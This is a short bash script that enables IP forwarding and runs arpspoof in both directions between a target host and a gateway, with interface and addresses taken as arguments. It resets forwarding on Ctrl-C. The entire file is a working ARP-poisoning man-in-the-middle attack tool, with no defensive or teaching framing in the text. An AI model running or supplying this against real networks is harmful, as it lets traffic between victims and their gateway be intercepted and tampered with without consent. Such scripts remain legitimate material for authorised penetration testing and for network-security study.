#!/bin/bash

#trap ctrl-c and call ctrl_c()
trap ctrl_c INT

function ctrl_c() {
    echo "catch ctrl_c"
    ./disable_ip_forward.sh
}

echo arguments $# 

if [ $# -ne 3 ]; then
   echo "Wrong number of arguments"
   echo "usage spoof interface target-ip gw-ip"
   exit 1
fi

#enable ip forwarding

echo "Enabling Ip forwarding.."

#keno prin kai meta ta {}
#using () makes the command inside to run in a sub-shell and calling exit cause 
#toexit the sub-shell, hence execution continues in the main script

echo 1 > /proc/sys/net/ipv4/ip_forward || { echo -e "could not enable ip forwarding. Exiting\n"; exit 1; }
echo -e "ip forward enabled. Cating file\n"
cat /proc/sys/net/ipv4/ip_forward
echo -e "\n"

#arpspoof -i eth0 -t TARGET_ip GW_ip
arpspoof -i $1 -t $2 $3 &
#ping $2
#arpspoof -i eth0 -t GW_ip TARGET_ip 
arpspoof -i $1 -t $3 $2

